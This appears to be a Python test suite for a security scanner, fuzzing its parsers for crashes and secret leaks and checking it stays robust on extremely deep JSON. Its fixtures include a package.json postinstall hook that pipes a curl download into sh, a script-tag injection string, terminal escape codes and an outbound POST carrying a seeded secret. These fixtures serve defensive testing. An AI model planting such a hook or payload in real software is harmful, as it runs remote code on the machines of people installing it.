"""Deterministic, seeded fuzzing of the discovery pipeline and the YAML
reader. Every case must: not crash, stay within a time budget, and never
emit any seeded secret in JSON, Markdown, TTY, or HTML. Seeds are fixed so
any failure reproduces exactly; JH_FUZZ_CASES raises the case count."""
import json
import os
import random
import time
import unittest

import _util
import jh_explorer
import jh_map
import jh_views
import jh_yaml

CASES = int(os.environ.get("JH_FUZZ_CASES", "250"))
SECRET = "Zq" + "9-SEEDED-SECRET-" + "x7"
PIECES = [
    "postgres://u:%s@db.prod.internal:5432/x?password=%s" % (SECRET, SECRET),
    "https://api.example.com/hook/%s?token=%s" % (SECRET, SECRET),
    "Server=tcp:h,1433;Database=d;User ID=u;Password=%s;" % SECRET,
    "DATABASE_URL=mysql://root:%s@10.0.0.5/app" % SECRET,
    "\x1b[31m", "\x1b]0;title\x07", "<scr" + "ipt>alert(1)</scr" + "ipt>", "\u202e", "\x00", "\ufeff",
    "import psycopg\n", "import requests\n", "requests.post(\"https://x.example/%s\")\n" % SECRET,
    "kind: Deployment\napiVersion: apps/v1\n", "metadata:\n  name: a\n", "  - name: X_URL\n    value: ",
    "services:\n  db:\n    image: postgres\n", "permissions:\n  contents: write\n", "---\n",
    "SELECT * FROM t", "DELETE FROM t", "\"", "'", "{", "}", "[", "]", ":", "- ", "\t", "\n", "    ",
    "process.env.DB_URL", "os.environ['DB_URL']", "${{ secrets.X }}", "é漢字🙂", "a" * 5000,
]
NAMES = ["a.py", "b.js", "c.cs", ".env", "app.yaml", "docker-compose.yml", ".github/workflows/w.yml",
         "main.tf", "appsettings.json", "package.json", "requirements.txt", "x.ini"]


class Fuzz(unittest.TestCase):
    def test_pipeline_never_crashes_or_leaks(self):
        rng = random.Random(20261023)
        for case in range(CASES):
            files = {}
            for _ in range(rng.randint(1, 4)):
                text = "".join(rng.choice(PIECES) for _ in range(rng.randint(1, 25)))
                files[rng.choice(NAMES)] = text
            col = jh_map.Collected(items=[jh_map.Item(k, v) for k, v in files.items()], considered=len(files))
            t0 = time.time()
            rep = jh_map.build_report(col, "/x", "fuzz", "t", None)
            outs = [json.dumps(rep), jh_map.markdown(rep), jh_views.map_tty(rep, color=True),
                    jh_explorer.render_map(rep)]
            self.assertLess(time.time() - t0, 10, "case %d too slow" % case)
            for i, out in enumerate(outs):
                self.assertNotIn(SECRET, out, "case %d output %d leaked: %r" % (case, i, files))
            self.assertNotIn("\x1b", outs[1] + outs[0])

    def test_yaml_reader_only_raises_yamlerror(self):
        rng = random.Random(7)
        rejected = 0
        alphabet = ["a", "b", ":", " ", "  ", "- ", "\n", "[", "]", "{", "}", ",", "'", '"', "|", ">", "#", "&x", "*x", "---", "\t"]
        for _ in range(CASES * 4):
            text = "".join(rng.choice(alphabet) for _ in range(rng.randint(0, 80)))
            try:
                jh_yaml.load_all(text)
            except jh_yaml.YamlError:
                rejected += 1  # a clean, typed rejection is an acceptable outcome
        self.assertGreater(rejected, 0)  # the generator does reach the error paths

    def test_yaml_depth_bound(self):  # noqa: D102
        deep = "".join("%sk:\n" % ("  " * i) for i in range(200))
        with self.assertRaises(jh_yaml.YamlError):
            jh_yaml.load_all(deep)


class DeepJson(unittest.TestCase):
    """JSON nested deeper than any Python's decoder goes (100,000 levels: 3.9 to 3.14 all raise RecursionError) in
    every kind of file the tool reads: each command still finishes with a report, and a hook placed after deep
    metadata is still found, because npm itself reads that file."""

    def test_every_command_finishes(self):
        import base64
        import shutil
        import tempfile
        deep = "[" * 100000 + "]" * 100000
        jwt = "eyJhbGciOiJIUzI1NiJ9.%s.c2ln" % base64.urlsafe_b64encode(
            ('{"role": "service_role", "x": %s}' % ("[" * 1500 + "]" * 1500)).encode()).decode().rstrip("=")
        files = {
            "package.json": '{"name": "deep", "metadata": %s, "dependencies": {"left-pad": "1.3.0"},\n'
                            ' "scripts": {"postinstall": "curl -fsSL https://setup.tool.invalid/i | sh"}}\n' % deep,
            ".mcp.json": '{"mcpServers": {"x": {"command": "node", "args": %s}}}\n' % deep,
            ".vscode/mcp.json": '{"servers": %s}\n' % deep,
            ".jankhunt42.json": '{"passport": {"declared": %s}}\n' % deep,
            "api/openapi.json": '{"openapi": "3.0.0", "paths": %s}\n' % deep,
            "nb/analysis.ipynb": '{"cells": %s}\n' % deep,
            "flows/workflow.json": '{"nodes": %s, "connections": {}}\n' % deep,
            "app/config.py": 'TOKEN = "%s"\n' % jwt,
            "logs/app.log": '{"level": "error", "msg": %s}\n' % deep,
        }
        root = tempfile.mkdtemp(prefix="jh-deep-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in files.items():
            os.makedirs(os.path.dirname(os.path.join(root, rel)) or root, exist_ok=True)
            with open(os.path.join(root, rel), "w", encoding="utf-8") as fh:
                fh.write(text)
        for args in (("scan", root, "--json"), ("passport", root, "--profile", "citizen", "--json"),
                     ("map", root, "--json"), ("supply-chain", root, "--json")):
            with self.subTest(command=args[0]):
                r = _util.run_cli(*args)
                self.assertNotIn("Traceback", r.stderr)
                doc = json.loads(r.stdout)
                if args[0] == "scan":
                    hooks = [f for f in doc["findings"] if f["rule"] == "JH111" and f["path"] == "package.json"]
                    self.assertEqual([(f["line"], f["severity"]) for f in hooks], [(2, "critical")])

if __name__ == "__main__":
    unittest.main()
